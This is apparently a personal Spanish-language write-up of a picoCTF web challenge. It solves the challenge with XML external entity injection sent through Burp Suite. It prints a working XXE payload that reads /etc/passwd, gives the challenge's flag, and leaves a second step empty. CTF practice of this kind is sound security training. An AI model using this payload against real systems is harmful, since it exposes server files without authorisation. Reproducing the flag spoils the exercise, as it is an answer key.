
#### Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

#### Hints 
1. XML external entity Injection


#### Solución:

#### 1. Usamos Burpsuite

````
- Activamos el proxy: FoxyProxy de firefox.
- Nos fuimos al Burpsuite.
	- Mandamos el Request del Proxy a Repeater.
	- Ahí le pegamos el Payload para hacer un ataque XML de tipo XXE
		- XXE:
		- <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
	<ID>&xxe;
	</ID><
	/data>

`````
![[Pasted image 20250407162112.png]]




---
---
#### 2.

````

`````


#### Pico:
picoCTF{XML_3xtern@L_3nt1t1ty_540f4f1e}

#### Notas adicionales:
Debemos cuidar las configuraciones para proteger el XML, y que no lo puedan alterear.

#### Referencias:
https://www.youtube.com/watch?v=b1pGlutUL34


